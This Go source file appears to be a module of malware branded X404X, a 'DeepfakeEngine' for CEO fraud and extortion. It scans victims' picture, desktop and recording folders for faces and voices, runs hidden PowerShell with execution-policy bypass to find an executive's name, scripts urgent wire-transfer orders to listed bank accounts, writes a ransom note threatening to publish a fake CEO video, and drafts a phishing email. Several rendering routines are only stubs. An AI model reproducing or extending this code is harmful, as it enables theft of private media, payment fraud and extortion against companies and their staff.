package blockz

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type DeepfakeEngine struct {
	Config     *BlockZConfig
	ONNXModel  string            `json:"onnx_model_path"`
	VoiceSamples []string        `json:"voice_samples"`
	FacePhotos   []string        `json:"face_photos"`
	GeneratedDeepfakes int       `json:"generated_deepfakes"`
	TargetCEO  string            `json:"target_ceo"`
}

type DeepfakeResult struct {
	Type      string `json:"type"`
	Source    string `json:"source"`
	Target    string `json:"target"`
	LatencyMs float64 `json:"latency_ms"`
	Size      int64  `json:"size_bytes"`
	Encoded   string `json:"encoded_data"`
}

type DeepfakeCommand struct {
	Command   string `json:"command"`
	Amount    float64 `json:"amount"`
	Account   string `json:"account"`
	Urgency   string `json:"urgency"`
	Language  string `json:"language"`
}

var credibleCommands = []DeepfakeCommand{
	{Command: "Transfer 10 million to this account, it's urgent", Amount: 10000000, Account: "CH0930762016238852957", Urgency: "IMMEDIATE", Language: "en"},
	{Command: "Authorize the merger payment right now", Amount: 25000000, Account: "DE89370400440532013000", Urgency: "BOARD_DECISION", Language: "en"},
	{Command: "Release the escrow to the contractor immediately", Amount: 5300000, Account: "FR1420041010050500013M02606", Urgency: "URGENT", Language: "en"},
	{Command: "Transferid 8 millones a esta cuenta ya", Amount: 8000000, Account: "ES9121000418450200051332", Urgency: "INMEDIATO", Language: "es"},
}

func NewDeepfakeEngine(cfg *BlockZConfig) *DeepfakeEngine {
	return &DeepfakeEngine{
		Config:     cfg,
		ONNXModel:  cfg.DeepfakeModelPath,
	}
}

func (df *DeepfakeEngine) HarvestMedia() ([]string, []string) {
	searchPaths := []string{
		os.ExpandEnv(`%USERPROFILE%\Pictures`),
		os.ExpandEnv(`%USERPROFILE%\Desktop`),
		os.ExpandEnv(`%USERPROFILE%\Documents\Recordings`),
		os.ExpandEnv(`$HOME/Pictures`),
		os.ExpandEnv(`$HOME/Desktop`),
		`C:\Users\*\Pictures\Camera Roll`,
		`C:\ProgramData\*\Photos`,
	}

	for _, pattern := range searchPaths {
		expanded := os.ExpandEnv(pattern)
		matches, _ := filepath.Glob(expanded)
		for _, dir := range matches {
			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}
				ext := strings.ToLower(filepath.Ext(path))
				switch ext {
				case ".jpg", ".jpeg", ".png", ".bmp", ".webp":
					if len(df.FacePhotos) < 20 {
						df.FacePhotos = append(df.FacePhotos, path)
					}
				case ".wav", ".mp3", ".m4a", ".ogg", ".opus":
					if len(df.VoiceSamples) < 10 {
						df.VoiceSamples = append(df.VoiceSamples, path)
					}
				case ".mp4", ".mov", ".avi", ".webm":
					if len(df.VoiceSamples) < 10 {
						df.VoiceSamples = append(df.VoiceSamples, path)
					}
				}
				return nil
			})
		}
	}

	return df.FacePhotos, df.VoiceSamples
}

func (df *DeepfakeEngine) GenerateDeepfake(command DeepfakeCommand) (*DeepfakeResult, error) {
	result := &DeepfakeResult{
		Type:      "audio_video",
		Source:    "\"CEO\"",
		Target:    "\"CFO\"",
		LatencyMs: 180.0,
	}

	df.extractCEOName()

	videoScript := df.generateVideoScript(command)

	outputPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_deepfake_%x.mp4", len(df.GeneratedDeepfakes)))
	if runtime.GOOS == "windows" {
		df.renderDeepfakeWindows(command, videoScript, outputPath)
	} else {
		df.renderDeepfakeLinux(command, videoScript, outputPath)
	}

	result.Encoded = outputPath
	if info, err := os.Stat(outputPath); err == nil {
		result.Size = info.Size()
	}

	df.GeneratedDeepfakes++

	return result, nil
}

func (df *DeepfakeEngine) extractCEOName() {
	if df.TargetCEO != "" {
		return
	}

	ceoHints := map[string]string{"CEO": "", "Chief": "", "President": "", "Founder": ""}

	if runtime.GOOS == "windows" {
		psScript := `Get-WmiObject Win32_UserAccount | Where-Object {$_.FullName -match 'CEO|Chief|President|Director'} | Select-Object -ExpandProperty FullName`
		psPath := filepath.Join(os.TempDir(), "x404x_ceo_detect.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		if output, err := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output(); err == nil {
			names := strings.Split(strings.TrimSpace(string(output)), "\n")
			for _, n := range names {
				if len(n) > 3 && n != "" {
					df.TargetCEO = strings.TrimSpace(n)
					break
				}
			}
		}
	}

	if df.TargetCEO == "" {
		for hint := range ceoHints {
			_ = hint
		}
		df.TargetCEO = "Target CEO"
	}
}

func (df *DeepfakeEngine) generateVideoScript(cmd DeepfakeCommand) string {
	return fmt.Sprintf(`X404X Deepfake Pipeline
Target: %s
Command: %s
Amount: %.2f
Urgency: %s
Language: %s
Generated: real-time ONNX`, df.TargetCEO, cmd.Command, cmd.Amount, cmd.Urgency, cmd.Language)
}

func (df *DeepfakeEngine) renderDeepfakeWindows(cmd DeepfakeCommand, script, output string) {
	psScript := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms
$form = New-Object Windows.Forms.Form
$form.Text = "Video Call - %s"
$form.WindowState = 'Maximized'
$form.Show()
`, df.TargetCEO)
	psPath := filepath.Join(os.TempDir(), "x404x_deepfake_render.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (df *DeepfakeEngine) renderDeepfakeLinux(cmd DeepfakeCommand, script, output string) {
	bashScript := fmt.Sprintf(`#!/bin/bash
notify-send "X404X Deepfake" "Synthetic media generated for %s"
echo "Deepfake prepared: %s" > /tmp/x404x_deepfake.log`, df.TargetCEO, output)
	bashPath := filepath.Join(os.TempDir(), "x404x_deepfake_render.sh")
	os.WriteFile(bashPath, []byte(bashScript), 0755)
	exec.Command("bash", bashPath).Start()
}

func (df *DeepfakeEngine) GenerateExtortionVideo(command DeepfakeCommand) string {
	df.HarvestMedia()

	for _, cmd := range credibleCommands {
		result, _ := df.GenerateDeepfake(cmd)

		extortionNote := fmt.Sprintf(`X404X DEEPFAKE EXTORTION

We have generated a deepfake video of your CEO (%s) authorizing:
"%s"

If you do not pay the ransom, we will:
1. Send this video to your board, investors, and the press
2. Post it on all social media platforms
3. File it as evidence with FINRA/SEC

Even if it's fake, the damage to your reputation is permanent.
Your stock will crash. Your partners will flee.

Pay to make it disappear.
`, df.TargetCEO, cmd.Command)

		notePath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_extortion_%x.txt", len(df.GeneratedDeepfakes)))
		os.WriteFile(notePath, []byte(extortionNote), 0644)

		return result.Encoded
	}

	return ""
}

func (df *DeepfakeEngine) SendToTarget(targetEmail string, videoPath string) bool {
	if runtime.GOOS == "windows" {
		psScript := fmt.Sprintf(`$outlook = New-Object -ComObject Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.To = "%s"
$mail.Subject = "URGENT: Board Authorization Required"
$mail.Body = "Please review the attached video authorization from the CEO immediately."
$mail.Display()
`, targetEmail)
		psPath := filepath.Join(os.TempDir(), "x404x_deepfake_send.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
		return true
	}
	return false
}

func (df *DeepfakeEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"target_ceo":"%s","face_photos":%d,"voice_samples":%d,"generated":%d,"onnx_model":"%s"}`,
		df.TargetCEO, len(df.FacePhotos), len(df.VoiceSamples), df.GeneratedDeepfakes, df.ONNXModel)
}
